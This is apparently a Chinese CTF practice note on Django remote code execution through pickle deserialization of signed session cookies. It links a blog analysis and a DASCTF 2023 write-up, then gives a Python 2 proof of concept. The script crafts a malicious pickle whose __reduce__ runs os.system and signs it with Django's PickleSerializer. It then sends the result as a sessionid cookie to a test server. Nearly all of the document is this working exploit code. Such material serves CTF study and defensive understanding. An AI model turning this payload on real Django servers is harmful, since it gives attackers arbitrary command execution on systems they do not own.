# 文章
[Django任意代码执行0day漏洞分析_django有反序列化漏洞吗_FLy_鹏程万里的博客-CSDN博客](F:\LocalCTF\Django任意代码执行0day漏洞分析_django 3.2.18 漏洞利用_FLy_鹏程万里的博客-CSDN博客.html)

# 例题
[DASCTF 2023 & 0X401 Web WriteUp | Boogiepop Doesn’t Laugh](F:\LocalCTF\DASCTF 2023 & 0X401 Web WriteUp _ Boogiepop Doesn't Laugh.html)

# POC
```python
import os
import urllib2
import cookielib
from django.conf import settings
from django.core import signing
from django.contrib.sessions.backends import signed_cookies

os.environ.setdefault('DJANGO_SETTINGS_MODULE','settings')


class Run(object):
    def __reduce__(self):
        return (os.system,('touch /tmp/xxlegend.log',))
sess = signing.dumps(Run(), serializer=signed_cookies.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')
print sess


url = 'http://10.24.35.228:8000/favicon.ico'
headers = {'Cookie':'sessionid="%s"' %(sess)}
request = urllib2.Request(url,headers = headers)
response = urllib2.urlopen(request)
print response.read()
```
